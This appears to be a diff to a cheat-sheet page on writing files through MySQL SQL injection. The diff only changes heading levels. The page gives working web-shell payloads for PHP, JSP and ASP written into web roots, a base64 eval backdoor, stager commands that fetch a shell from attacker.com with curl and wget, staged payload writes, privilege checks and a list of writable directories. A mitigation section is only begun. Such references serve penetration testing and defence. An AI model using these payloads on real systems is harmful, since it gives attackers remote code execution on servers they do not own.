@@ -7,11 +7,9 @@ tags: ["file operations", "outfile", "dumpfile", "web shell"]
 lastUpdated: 2025-03-15
 ---
 
-## Writing Files
-
 MySQL provides functionality to write data to files on the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.
 
-### Prerequisites
+## Prerequisites
 
 To write files from MySQL, the following conditions must be met:
 
@@ -20,7 +18,7 @@ To write files from MySQL, the following conditions must be met:
 3. You must know the absolute path where you want to write
 4. The `secure_file_priv` setting must either be empty or set to a directory where you can write
 
-### Important Constraints
+## Important Constraints
 
 | Constraint         | Description                                                                    |
 | ------------------ | ------------------------------------------------------------------------------ |
@@ -29,11 +27,11 @@ To write files from MySQL, the following conditions must be met:
 | Pathname Quoting   | Quotation marks are mandatory for pathnames (hex encoding like 0x cannot work) |
 | Max Packet Size    | Limited by `@@max_allowed_packet` (default 4MB in 5.7, 64MB in 8.0+)           |
 
-### Methods for Writing Files
+## Methods for Writing Files
 
 MySQL provides two primary statements for writing to files:
 
-#### SELECT INTO OUTFILE
+### SELECT INTO OUTFILE
 
 Writes a result set to a file, adding newlines between rows and field separators between columns:
 
@@ -41,7 +39,7 @@ Writes a result set to a file, adding newlines between rows and field separators
 SELECT 'data to write' INTO OUTFILE '/path/to/file.txt';
 ```
 
-#### SELECT INTO DUMPFILE
+### SELECT INTO DUMPFILE
 
 Writes a result set to a file without any formatting (better for binary data and web shells):
 
@@ -49,7 +47,7 @@ Writes a result set to a file without any formatting (better for binary data and
 SELECT 'data to write' INTO DUMPFILE '/path/to/file.txt';
 ```
 
-### Checking for FILE Privilege
+## Checking for FILE Privilege
 
 Before attempting to write files, check if the current user has the necessary privilege:
 
@@ -63,7 +61,7 @@ WHERE grantee LIKE CONCAT("'", SUBSTRING_INDEX(USER(), '@', 1), "'@%")
 AND privilege_type = 'FILE';
 ```
 
-### Checking secure_file_priv Setting
+## Checking secure_file_priv Setting
 
 The `secure_file_priv` setting restricts where MySQL can read/write files:
 
@@ -77,11 +75,11 @@ Results:
 - NULL: You cannot read/write any files
 - Directory path: You can only read/write in that directory
 
-### Writing a Web Shell
+## Writing a Web Shell
 
 One of the most common exploits is writing a web shell to gain remote code execution:
 
-#### PHP Web Shell
+### PHP Web Shell
 
 ```sql
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
@@ -90,19 +88,19 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 SELECT '<?php $c=$_GET["c"]; if(isset($c)) { eval(base64_decode($c)); } ?>' INTO OUTFILE '/var/www/html/images/blank.php';
 ```
 
-#### JSP Web Shell
+### JSP Web Shell
 
 ```sql
 SELECT '<%@ page import="java.util.*,java.io.*"%><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>' INTO OUTFILE '/var/lib/tomcat/webapps/ROOT/shell.jsp';
 ```
 
-#### ASP Web Shell
+### ASP Web Shell
 
 ```sql
 SELECT '<%Response.Write(CreateObject("WScript.Shell").exec(Request.QueryString("cmd")).StdOut.ReadAll())%>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.asp';
 ```
 
-### Writing Multiple Lines
+## Writing Multiple Lines
 
 For multiline content, you can use string concatenation and CHAR():
 
@@ -117,11 +115,11 @@ SELECT CONCAT(
 ) INTO DUMPFILE '/var/www/html/cache/stats.php';
 ```
 
-### Payload Delivery Techniques
+## Payload Delivery Techniques
 
 When query length is limited (e.g., by application input validation or `@@max_allowed_packet`), write a small stager to fetch the full payload.
 
-#### PHP Downloader
+### PHP Downloader
 
 Write a minimal PHP script that downloads and writes a larger shell:
 
@@ -144,7 +142,7 @@ SELECT '<?php shell_exec("curl -o /var/www/html/shell.php http://attacker.com/sh
 SELECT '<?php shell_exec("wget -O /var/www/html/shell.php http://attacker.com/shell.txt");?>' INTO OUTFILE '/var/www/html/dl.php';
 ```
 
-#### Staged SQL Injection
+### Staged SQL Injection
 
 If no outbound network access is available, stage the payload via multiple SQL injection writes:
 
@@ -159,9 +157,9 @@ SELECT '"c3lzdGVtKCRfR0VUWydjJ10pOw=="; $a($b); ?>' INTO OUTFILE '/var/www/html/
 SELECT '<?php include"/var/www/html/p1.txt";include"/var/www/html/p2.txt";?>' INTO OUTFILE '/var/www/html/shell.php';
 ```
 
-### Overcoming Restrictions
+## Overcoming Restrictions
 
-#### When secure_file_priv is set
+### When secure_file_priv is set
 
 If `secure_file_priv` is set to a specific directory, you're limited to writing there:
 
@@ -171,7 +169,7 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/lib/mysql-files/shell
 -- Then leverage another vulnerability to create a symlink from web root to this file
 ```
 
-#### Finding Writable Directories
+### Finding Writable Directories
 
 Common writable directories:
 
@@ -184,9 +182,9 @@ Common writable directories:
 /var/tmp/
 ```
 
-### Practical Examples
+## Practical Examples
 
-#### Writing a Simple Backdoor
+### Writing a Simple Backdoor
 
 ```sql
 -- Check where we can write
@@ -197,7 +195,7 @@ SELECT '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]
 INTO DUMPFILE '/var/www/html/images/1.php';
 ```
 
-#### Appending to Files
+### Appending to Files
 
 MySQL can't directly append to files, but you can sometimes use tricks with UNION:
 
@@ -209,7 +207,7 @@ SELECT 'First line' INTO OUTFILE '/tmp/test.txt';
 SELECT 'Second line' INTO OUTFILE '/tmp/test.txt';  -- Will overwrite or fail
 ```
 
-### Mitigation
+## Mitigation
 
 To prevent unauthorized file writing:
 
